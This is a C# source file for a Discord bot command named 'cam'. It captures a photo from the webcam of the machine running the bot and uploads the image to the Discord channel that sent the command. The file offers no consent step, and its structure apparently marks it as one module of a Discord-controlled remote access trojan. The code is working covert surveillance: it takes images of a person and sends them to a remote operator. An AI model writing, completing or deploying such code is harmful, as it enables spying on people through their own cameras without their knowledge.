using Discord;
using Discord.Commands;
using System.Runtime.InteropServices;
using Windows.Media.Capture;
using Windows.Media.MediaProperties;
using Windows.Storage.Streams;

namespace Main.Source.Bot.Commands
{
    public class Webcam : CommandBase
    {
        public override string Name => "cam";
        public override string Info => "Takes a picture from the users webcam";
        public override string Use => "No usage";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            try
            {
                var capture = new MediaCapture();
                await capture.InitializeAsync();

                var ras = new InMemoryRandomAccessStream();

                await capture.CapturePhotoToStreamAsync(
                    ImageEncodingProperties.CreatePng(),
                    ras
                );

                var webcam = new MemoryStream();

                ras.Seek(0);

                await ras
                    .AsStreamForRead()
                    .CopyToAsync(webcam);

                webcam.Position = 0;

                capture.Dispose();
                ras.Dispose();

                using (webcam)
                {
                    await socket.Channel.SendFileAsync(
                        stream: webcam,
                        filename: "webcam.png",
                        messageReference: new MessageReference(socket.Message.Id)
                    );
                }
            }
            catch (UnauthorizedAccessException)
            {
                await socket.Message.ReplyAsync("No access to webcam");
            }
            catch (COMException)
            {
                await socket.Message.ReplyAsync("No webcam available");
            }
        }
    }
}
